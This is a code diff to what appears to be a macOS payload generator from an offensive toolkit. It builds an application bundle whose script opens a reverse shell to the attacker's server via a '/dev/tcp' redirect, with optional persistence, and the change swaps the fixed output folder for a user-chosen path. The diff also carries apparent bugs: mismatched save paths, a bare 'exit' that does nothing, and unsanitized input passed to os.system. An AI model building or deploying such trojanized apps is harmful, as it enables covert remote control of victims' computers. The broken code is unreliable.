@@ -30,7 +30,6 @@ class payload:
 	def run(self,server):
 		while 1:
 			shell = raw_input(h.info_general_raw("Target Shell: ")).strip(" ")
-                        name = raw_input(h.info_general_raw("Application Name: ")).strip(" ")
                         icon = raw_input(h.info_general_raw("Application Icon: ")).strip(" ")
 			persistence = raw_input(h.info_question_raw("Make Persistent? (y/n): ")).strip(" ").lower()
 			if persistence == "y":
@@ -39,24 +38,22 @@ class payload:
 			else:
 				shell_command = shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
 				break
-		if os.path.exists("payloads") == False:
-			os.mkdir("payloads")
-		if os.path.exists("payloads/macos_application") == False:
-			os.mkdir("payloads/macos_application")
-			os.system("""
-cp -r data/app/payload.app payloads/macos_application
-mv payloads/macos_application/payload.app payloads/macos_application/"""+name+""".app
-mv """+icon+""" payloads/macos_application/"""+name+""".app/Contents/Resources/payload.icns
-                        """)
-		payload_save_path = "payloads/macos_application/"+name+".app/Contents/MacOS/payload.sh"
-                sas = "payloads/macos_application/"+name+".app"
+		path = raw_input(h.info_general_raw("Output File: ")).strip(" ")
+		direct = os.path.split(path)[0]
+		if os.path.exists(direct):
+		    payload_save_path = path
+		else:
+		    h.info_error("Local directory: "+direct+": does not exist!")
+		    exit
+		os.system("cp -r data/app/payload.app "+path)
+		os.system("mv "+icon+" "+path+"/Contents/Resources/payload.icns")
+		payload_save_path = path+".app/Contents/MacOS/payload.sh"
 		payload = """\
 #! /usr/bin/env bash
-"""+shell_command+"""
-                """
-		h.info_general("Saving to " + sas + "...")
+"""+shell_command
+		h.info_general("Saving to " + path + "...")
 		f = open(payload_save_path,"w")
 		f.write(payload)
 		f.close()
-		h.info_success("Saved to " + sas + "!")
-		os.system("chmod +x payloads/macos_application/"+name+".app/Contents/MacOS/payload.sh")
+		h.info_success("Saved to " + path + "!")
+		os.system("chmod +x "+path+"/Contents/MacOS/payload.sh")
